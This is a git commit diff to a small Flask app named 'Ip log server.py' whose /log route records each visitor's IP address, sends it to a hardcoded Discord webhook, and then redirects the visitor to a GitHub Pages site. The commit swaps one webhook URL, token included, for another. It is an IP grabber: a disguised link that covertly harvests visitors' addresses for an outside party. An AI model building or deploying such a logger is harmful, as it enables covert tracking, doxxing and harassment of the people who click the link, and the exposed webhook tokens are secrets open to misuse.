91ca5bc0bd1fba1dc6b14001dbdab4662496f814
GENGAOG1 <g9645427@outlook.de>
2026-07-16 13:46:08 +0200

    Update Ip log server.py

--- Ip log server.py
+++ Ip log server.py
@@ -1,15 +1,14 @@
-from flask import Flask, request
+from flask import Flask, request , redirect
 from werkzeug.middleware.proxy_fix import ProxyFix
 import requests
 import os
-import time
 
 app = Flask(__name__)
 
 # Render-Proxy berücksichtigen
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1526282389628915726/HE9Q2YrI1na7ZMQqatS3f5KitCsa9vv0n7gMQ9KmmvtR1tfOgcwBMXkUyqowB0-YQdE8"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"
 
 @app.route("/log")
 def log_ip():
@@ -27,7 +26,3 @@ def log_ip():
     })
 
     return redirect("https://gengaog.github.io/-/")
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
